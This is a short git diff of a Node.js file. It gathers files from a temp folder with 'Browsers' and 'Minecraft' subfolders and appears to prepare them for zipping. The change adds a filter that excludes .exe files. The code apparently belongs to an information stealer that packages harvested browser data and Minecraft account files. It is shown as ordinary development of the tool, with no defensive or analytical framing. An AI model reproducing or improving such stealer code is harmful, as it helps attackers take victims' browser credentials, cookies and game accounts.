@@ -6,9 +6,10 @@ const { generateZipFromFiles } = require('../util/zip');
 const paths = [tempFolder, join(tempFolder, 'Browsers'), join(tempFolder, 'Minecraft')];
 fs.readdirSync(join(tempFolder, 'Browsers')).forEach((folder) => paths.push(join(tempFolder, 'Browsers', folder)));
 
-const files = fs.readdirSync(tempFolder).filter(file => file.split('.').length > 1);
+const filter = file => file.split('.').length > 1 && !file.endsWith('.exe');
+const files = fs.readdirSync(tempFolder).filter(filter);
 paths.forEach(path => {
-  fs.readdirSync(path).filter(file => file.split('.').length > 1).forEach(file => {
+  fs.readdirSync(path).filter(filter).forEach(file => {
     files.push(join(path.split(tempFolder.split(sep).pop())[1].replace(sep, ''), file));
   });
 });
